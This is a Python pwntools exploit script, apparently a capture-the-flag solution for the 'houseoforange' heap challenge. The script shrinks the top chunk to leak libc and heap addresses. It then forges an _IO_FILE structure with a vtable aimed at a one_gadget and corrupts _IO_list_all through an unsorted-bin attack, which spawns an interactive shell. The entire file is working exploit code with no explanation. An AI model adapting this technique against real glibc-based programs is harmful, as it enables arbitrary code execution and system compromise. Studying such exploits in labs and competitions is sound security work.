from pwn import *
debug=1
context.log_level = 'debug'
if debug:
    io = process('./houseoforange')
else:
    io = remote("",1234)
elf = ELF('./houseoforange')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
s       = lambda data               :io.send(data) 
sa      = lambda data1,data         :io.sendafter(data1, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda data1,data         :io.sendlineafter(data1, data)
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda data1, drop=True  :io.recvuntil(data1, drop)

def build(length,name,price,color): #4
    ru(b'Your choice : ') #malloc(0x10)
    sl('1')
    ru(b'Length of name :') #>0x1000 ->0x1000 malloc(length)
    sl(str(length))
    ru(b'Name :')
    s(name)
    ru(b'Price of Orange:') #calloc(0x8)
    sl(price)
    ru(b'Color of Orange:')
    sl(color)

def see():
    ru(b'Your choice : ')
    sl('2')
    ru(b'Name of house : ')
    hi= ru('\n')
    ru(b'House of Orange')
    return hi

def upg(length,name,price,color): #3
    ru(b'Your choice : ')
    sl('3')
    ru(b'Length of name :')
    sl(str(length))
    ru(b'Name:')
    s(name)#bytes.decode(name,"unicode-escape"))

    ru(b'Price of Orange:')
    sl(price)
    ru(b'Color of Orange:')
    sl(color)



build(12,'123','1','1')

c=p64(0x11111111)*3+p64(0x21)+p32(0x1)+p32(0x1f)+p64(0x0)#info

payload=c+p64(0x0)
payload+=p64(0xfa1)

upg(str(len(payload)),payload,'1','1')
build(0x1000,'123','1','1')

#leak libc
build(0x400,'11111111','1','1')
libc.address=u64((see()[8:]).ljust(8,b'\x00'))-3953032
print(hex(libc.address))
print(hex(libc.symbols['_IO_list_all']))

#leak heap
payload='1'*16
upg(str(len(payload)),payload,'1','1')
heapbase=u64((see()[16:]).ljust(8,b'\x00'))-0xc0
print(hex(heapbase))

#orange
onegadgets=[0x45216,0x4526a,0xf02a4,0xf1147]
c=p64(0)*3
c+=p64(libc.address+onegadgets[3]) #vtable
c=c.ljust(0x408,b'\x00')
c+=p64(0x21)+p32(0x1)+p32(0x1f)+p64(0x0)#info

iofile=p64(0x0)#b'/bin/sh\x00'  #IOfile / fd
iofile+=p64(0x61)  #offset(_IO_file->_chain)=0x68  (small[0x60]-main_arena+0x58)=0x68
iofile+=p64(libc.address)
iofile+=p64(libc.symbols['_IO_list_all']-0x10)#set _IO_list_all main_arena+0x58
iofile=iofile.ljust(0x20,b'\x00')
iofile+=p64(0)#_IO_file->_IO_write_base
iofile+=p64(1)#_IO_file->_IO_write_ptr
iofile=iofile.ljust(0xc0,b'\x00')
iofile+=p64(0xffffffffffffffff)#_IO_file->mode
iofile=iofile.ljust(0xd8,b'\x00')
iofile+=p64(heapbase+0xd0)#_IO_file->vtable
payload=c+iofile
upg(str(len(payload)),payload,'1','1')

#getshell
ru(b'Your choice : ') #malloc(0x10)
sl('1')

io.interactive()